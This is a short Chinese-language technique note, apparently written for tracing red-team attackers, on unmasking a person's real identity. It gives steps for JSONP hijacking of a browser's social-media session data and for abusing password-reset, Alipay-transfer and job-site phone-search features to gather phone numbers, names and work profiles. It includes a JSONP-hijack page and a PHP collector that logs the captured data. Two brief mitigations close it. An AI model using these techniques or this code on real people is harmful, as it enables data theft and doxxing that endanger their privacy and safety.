### Ref
- [记一次某大型活动溯源红队身份](https://mp.weixin.qq.com/s/5W5ipFC2YJUFwJjDecI8mw)
- [某期间用到的溯源技巧](https://mp.weixin.qq.com/s/Hhp8_mzOasgsd10v6EbkZQ)

### Procedure
- jsonp跨域劫持获取数据（类似CSRF）劫持到浏览器中社交账号的Cookie（如百度、爱奇艺、微博等），进而获取uid、邮箱号、手机号、登录名或真实姓名
- 已有邮箱通过网站的找回密码功能拿到手机号其中几位131xxxx2222
- 已知淘宝账号（任意手机号、邮箱、用户名，其一即可），手机淘宝app找回密码处，验证方式选择拍摄脸部，验证流程中获取对方的名字（部分）。
- 在知道地区的情况下，利用归属地数据库（https://github.com/zengzhan/qqzeng-ip）缩小范围，利用枚举缩小范围后的手机号反查邮箱，获取手机号<->邮箱匹配信息
- 已有手机号，支付宝转账，获取真实姓名（部分）
- 已有手机号，利用猎聘、脉脉、boss直聘，搜索手机号的功能，获取职场交友信息


### Code

#### 测试前端
```html

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<title>apppppppp</title>

<script src="http://xxx.com/api/jsonp.php? callback=jsonp1&other=xxx "></script> <!--调用存在jsonp劫持的api-->
<script>function test(obj){ <!--定义函数，接收jsonp劫持的api返回的数据-->
alert(JSON.stringify(obj));<!--弹窗jsonp返回的数据，并在弹窗内部使用JSON.stringify将avaScript值转为json字符串-->
}
test(jsonp1)<!--调用函数-->
</script>

</head>
</html>
```


#### 后端data.php接收代码
```php
<?php 
$data = $_GET['data'];//接收data数据
var_dump($data);
$fp = fopen('data.txt','a');//向data.txt中写入data数据
$fpp = fwrite($fp,$data."\r\n");
?>
```


### mitigations
- 可以关闭信息查询功能的一定要关闭，如支付宝、脉脉、猎聘等;
- 尽量避免多个网站使用同一手机号，邮箱，密码等信息。
